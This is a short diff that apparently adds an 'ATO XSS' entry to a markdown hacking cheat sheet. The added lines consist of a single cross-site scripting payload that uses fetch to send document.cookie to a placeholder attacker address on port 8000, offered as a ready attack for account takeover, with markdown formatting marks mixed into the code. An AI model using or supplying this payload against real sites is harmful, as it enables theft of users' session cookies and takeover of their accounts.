@@ -44,3 +44,9 @@ CTRL + U
 ```
 ---
 
+#### ATO XSS
+```xss
+**_<script>fetch(‘_**[**_http://YOUR-IP:8000/?c='+document.cookie_**](http://your-ip:8000/?c=%27+document.cookie)**_)</script>_**
+```
+
+
